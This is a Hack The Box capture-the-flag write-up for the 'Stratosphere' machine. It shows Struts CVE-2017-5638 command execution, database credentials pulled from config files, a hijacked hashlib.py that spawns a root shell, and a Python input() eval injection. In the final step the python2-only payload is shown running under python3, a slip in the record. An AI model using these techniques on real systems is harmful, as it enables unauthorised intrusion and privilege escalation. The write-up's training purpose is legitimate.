---
title: 'HTB | Stratosphere'
published: 2025-07-02
draft: false
description: 'HTB Machine `Stratosphere` writeup.'
tags: ['HackTheBox', 'linux']
---

# Recon : Phase 1

## Port Scanning

### TCP Scan - all ports

```
# Nmap 7.94SVN scan initiated Wed Aug 20 19:34:53 2025 as: nmap -sT -p- --min-rate=1000 -Pn -n -oN nmap/tcp_search 10.10.10.64
Nmap scan report for 10.10.10.64
Host is up (0.065s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

# Nmap done at Wed Aug 20 19:36:48 2025 -- 1 IP address (1 host up) scanned in 114.54 seconds
```

- Identified 3 ports : 22, 80, 8080
- Host : Debian based (that's new)
- No UDP ports identified.

## Web App Recon

- Same app running at both port 80 and 8080.
- Apart from `index.html` , another page `GettingStarted.html` , which says `site is under construction`.
- Seemed like a static website at first.

### Directory Bruteforcing

**Using `raft-medium-directories.txt` with `extension .html` and methods `GET` & `POST`**

```
manager
index.html
```

- Nothing interesting.

**Changed wordlist to `directory-list-medium.txt`**

- found a new endpoint `/Monitoring/`
- It redirects to `/Monitoring/example/Welcome.action`

### Application at `/Monitoring/example`

**Available endpoints**

```
Welcome.action
Login.action // Login form , always redirects to Menu.action
Register.action //under construction
Menu.action // under construction

(found)
Missing.action // under construction
```

#### Footprinting Application

- Based on the syntax of URLs , a google search revealed the application is running on **Apache Struts** framework.

# Exploitation : Phase 1

## Disclosed Vulnerabilities / CVEs

- In 2017, **CVE-2017-5638** was assigned which could lead to **Unauthorized Remote Code Execution**.
- **Apache Struts** utilized its built-in parser called _Jakarta Multipart parser_ for handling incoming upload requests.
- However, when it received any arbitrary malformed value in **Content-type** in requests, it throws an error with that value.
- **Struts** forward this error to another function that _evaluates_ it as **code** using **OGNL (Object Graph Navigation Language)—a powerful tool for processing expressions in Struts.**
- This evaluation isn't escaped properly, so the attacker's code gets run as if it's legitimate.

### CVE-2017-5638 PoC

Using this [PoC](https://github.com/mazen160/struts-pwn) , I can run system commands as user `tomcat8`.

#### Revshell

- Trying multiple ports and multiple payloads, but nothing worked to get a revshell.
- I could have tried using IPv6 address instead of IPv4, but that wouldn't have worked either as a firewall was deployed that blocked all outgoing requests.
- It wasn't the default `ufw` , it wasn't installed.
- Continuing further exploitaion in web shell.

# Recon : Phase 2

## `tomcat8` --> `richard`

### `tomcat-users.xml

- From within the webshell, I started with `tomcat-users.xml` file loated at `TOMCAT_INSTALLATION/conf/tomcat-users.xml` .
- I found a set of credentials but they weren't useful anywhere.

### `db_connect` file

- Located at tomcat installation root, this file contained 2 sets of credentials

```
[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin
```

# Exploitation : Phase 2

- Trying these at `mysql` , `admin / admin` worked.
- Since, I didn't had a proper shell, I had to execute any queries from cmdline, using the CVE PoC.

```shell
$ python3 cve-2017-5638.py --url http://10.10.10.64/Monitoring/ -c 'mysql -u admin -padmin -e "show databases;"'
```

    - Syntax is important, Single Quotes containing Double Quotes, not the other way else query fails.

- Using some more sql queries, I found the credentials for `richard` user.

```
fullName	password	username
Richard F. Smith	9tc*rhKuG5TyXvUJOrE^5CK7k	richard
```

- Now, I can SSH as `richard`

# Post Exploitation

## `richard` --> `root`

### `/home/richard` contents

- Apart from `user.txt` , the only interesting file was `test.py` , which was owned by user `root` and was `readable` and `executable` by group `richard`.
- The user `richard` had access to run this file as `root` (`sudo -l`).

### `test.py`

- This file contained hashes and asked for `input` from the user, as cracked strings.
- At the end, if all hashes cracked, the file executes `/root/success.py` file.

#### Cracking Hashes

- All of the hashes were unsalted which enabled me crack all these using `crackstation`.
- The last one I had to crack myself.
- After cracking all these, when it came to execute `/root/success.py` , the file was not found.

#### Python Library Hijacking

```shell
richard@stratosphere:~$ python3 -c 'import sys;print(sys.path)'
['', '/usr/lib/python37.zip', '/usr/lib/python3.7', '/usr/lib/python3.7/lib-dynload', '/usr/local/lib/python3.7/dist-packages', '/usr/lib/python3/dist-packages']
```

- Before trying to crack hashes, I focused if I could exploit this script by hijacking its dependencies which were : `hashlib` and `os`
- Both of these dependencies files (`hashlib.py` and `os.py`) were owned by root , and I had no access to edit their contents.
- Next, the folders containing python libraries on the system weren't also writable.

**Creating a new hashlib.py**

- The first option in `sys.path` represents current working directory, this was someting I missed (ignored) on my first try.
- This means that python first searches for any _dependencies_ in the current working directory.
- Next, I created a file `hashlib.py` and wrote a function `md5()` in it.

```python
#!/usr/bin/env python3

import os

def md5():
    os.system("/bin/bash")

```

- Now, when running `test.py` with `sudo` privileges, I can spawn a root shell.

```shell
richard@stratosphere:~$ sudo python3 /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb
anything
root@stratosphere:/home/richard# cd ~
root@stratosphere:~$ cat root.txt
```

#### Unintended Solution form **0xdf** : Python2 instead of Python3

- **0xdf** mentioned is his writeup about the differences between some functions in python2 and python3.
- Particularly, the `input` function in python2 is implemented as `eval(raw_input(prompt))` , which means the input passed from the user will be evaluated .
- For example, an input of `2 + 3` in python3 will be read as `2 + 3` but in python2 it will be read as `5`.

```shell
richard@stratosphere:~$ sudo python3 /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb
2 +3
2 +3
Sorry, that's not right
richard@stratosphere:~$ sudo python2 /home/richard/test.py
python2    python2.7
richard@stratosphere:~$ sudo python2 /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb
2 +3
5
```

- We can use this as there are multiple versions of python installed, including `python2`.

```shell
richard@stratosphere:~$ sudo python3 /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb
__import__("os").system("cat /root/root.txt")
1b82f**********ea  # root flag
0
```
